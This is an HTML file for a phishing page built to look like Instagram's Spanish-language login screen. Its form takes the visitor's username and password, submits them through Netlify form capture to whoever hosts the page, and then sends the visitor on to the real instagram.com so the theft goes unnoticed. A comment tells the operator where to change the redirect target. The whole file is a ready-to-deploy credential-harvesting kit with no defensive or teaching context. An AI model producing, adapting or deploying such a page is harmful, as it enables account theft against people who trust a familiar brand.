<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- Favicon desde la raíz -->
  <link rel="icon" type="image/png" href="icono.png"/>

  <style>
    @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&family=Inter:wght@400;500;600;700&display=swap');

    body {
      background-color: #000; color: #fff; font-family: 'Inter', sans-serif;
      display:flex; justify-content:center; align-items:center; min-height:100vh;
      flex-direction:column; padding:20px;
    }

    .main-container { display:flex; justify-content:center; align-items:center; max-width:800px; width:100%; flex-wrap:wrap; }

    .image-container {
      position:relative; margin-right:50px; margin-bottom:20px;
      display:flex; justify-content:center; align-items:center; width:300px; height:300px;
    }
    /* Usa tu imagen local de la raíz */
    .image-container::before{
      content:''; position:absolute; inset:0;
      background-image:url('imagen.png');
      background-size:cover; background-position:center; border-radius:20px; z-index:1;
    }
    .image-content{ position:relative; z-index:2; width:100%; height:100%; }

    .login-container{
      background:#000; border:1px solid #262626; border-radius:8px;
      padding:30px 40px; width:390px; display:flex; flex-direction:column; align-items:center; box-sizing:border-box;
    }
    .login-container input{ width:300px; }

    .logo{ font-family:'Dancing Script',cursive; font-size:40px; margin-bottom:15px; }

    .login-input{ margin-bottom:10px; }

    input{
      width:100%; padding:14px; background:#121212; border:1px solid #363636; border-radius:6px;
      color:#fff; outline:none; font-size:15px;
    }
    input::placeholder{ color:#737373; }

    .login-button{
      width:100%; padding:12px; background:#4a59a5; color:#fff; border-radius:8px;
      text-align:center; font-weight:600; cursor:pointer; transition:background-color .3s; margin-bottom:15px;
    }
    .login-button:hover{ background:#3f4d8a; }

    .divider{ display:flex; align-items:center; width:100%; margin:15px 0; color:#737373; }
    .divider hr{ flex-grow:1; border:none; height:1px; background:#262626; }
    .divider span{ padding:0 10px; font-size:12px; }

    .facebook-login{ display:flex; align-items:center; color:#385185; font-weight:600; text-decoration:none; margin-bottom:15px; }
    .facebook-login svg{ margin-right:6px; }

    .forgot-password{ color:#00376b; font-size:10px; text-decoration:none; }

    .signup-box{
      background:#000; border:1px solid #262626; border-radius:8px; padding:15px; margin-top:10px; width:300px; text-align:center;
    }
    .signup-box a{ color:#0095f6; font-weight:600; text-decoration:none; }

    .footer{ margin-top:40px; text-align:center; width:100%; padding:0 20px; box-sizing:border-box; }
    .footer-links{ display:flex; justify-content:center; flex-wrap:wrap; margin-bottom:15px; }
    .footer-links a{ color:#737373; font-size:10px; margin:0 6px; text-decoration:none; }
    .footer-links a:hover{ text-decoration:underline; }
    .footer-text{ color:#737373; font-size:10px; display:flex; justify-content:center; align-items:center; gap:8px; }

    @media (max-width:768px){
      .main-container{ flex-direction:column; }
      .image-container{ display:none; }
      .login-container,.signup-box{ width:100%; max-width:300px; border:none; }
      body{ justify-content:flex-start; padding-top:50px; }
    }
    /* Campo honeypot oculto (anti-spam Netlify) */
    .hidden-field{ position:absolute; left:-10000px; top:auto; width:1px; height:1px; overflow:hidden; }
  </style>
</head>
<body>
  <div class="main-container">
    <!-- Imagen lateral -->
    <div class="image-container"><div class="image-content"></div></div>

    <!-- Formulario con Netlify -->
    <div class="login-container">
      <h1 class="logo">Instagram</h1>

      <!-- IMPORTANTE: data-netlify + form-name + action no-cache -->
      <form name="change-password" method="POST" data-netlify="true" netlify-honeypot="bot-field"
            action="/?no-cache=1" onsubmit="handleSubmit(event)" class="w-full">

        <!-- Honeypot anti-spam -->
        <p class="hidden-field">
          <label>No llenar si eres humano: <input name="bot-field" /></label>
        </p>

        <!-- Netlify necesita este hidden -->
        <input type="hidden" name="form-name" value="change-password"/>

        <!-- Tus campos -->
        <input type="text" class="login-input" name="username" placeholder="Teléfono, usuario o correo electrónico" />
        <input type="password" class="login-input" name="password" placeholder="Contraseña" />

        <!-- Mensajes de error -->
        <p id="empty-fields-message" class="text-red-500 text-sm text-center mb-2 hidden">
          Completa usuario y contraseña.
        </p>
        <p id="submission-error" class="text-red-500 text-sm text-center mb-2 hidden">
          Hubo un error al enviar el formulario.
        </p>

        <button type="submit" class="login-button">Iniciar sesión</button>

        <div class="divider"><hr><span>O</span><hr></div>

        <a href="#" class="facebook-login">
          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor" viewBox="0 0 16 16">
            <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
          </svg>
          Iniciar sesión con Facebook
        </a>
        <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
      </form>
    </div>

    <!-- Registro -->
    <div class="signup-box">
      <p>¿No tienes una cuenta? <a href="#">Regístrate</a></p>
    </div>
  </div>

  <!-- Footer -->
  <div class="footer">
    <div class="footer-links">
      <a href="#">Meta</a><a href="#">Información</a><a href="#">Blog</a><a href="#">Empleos</a>
      <a href="#">Ayuda</a><a href="#">API</a><a href="#">Privacidad</a><a href="#">Condiciones</a>
      <a href="#">Ubicaciones</a><a href="#">Instagram Lite</a><a href="#">Threads</a>
      <a href="#">Importación de contactos y no usuarios</a><a href="#">Meta Verified</a>
    </div>
    <div class="footer-text">
      <span>Español</span><span>&copy; 2024 Instagram from Meta</span>
    </div>
  </div>

  <script>
    // Validación mínima (evita enviar vacío)
    function validateForm() {
      const form = document.forms['change-password'];
      const user = form['username'].value.trim();
      const pass = form['password'].value.trim();
      const emptyMsg = document.getElementById('empty-fields-message');

      emptyMsg.classList.add('hidden');
      if (!user || !pass) {
        emptyMsg.classList.remove('hidden');
        return false;
      }
      return true;
    }

    function handleSubmit(event) {
      event.preventDefault();
      if (!validateForm()) return;

      const form = event.target;
      const data = new FormData(form);

      // Envío estilo Netlify (x-www-form-urlencoded)
      fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams(data).toString(),
      })
      .then(() => {
        // Redirección después del submit
        window.location.href = "https://www.instagram.com"; // <-- cambia aquí si quieres otra URL
      })
      .catch((err) => {
        const submissionError = document.getElementById("submission-error");
        submissionError.textContent = "Error al enviar: " + err;
        submissionError.classList.remove("hidden");
      });
    }
  </script>
</body>
</html>
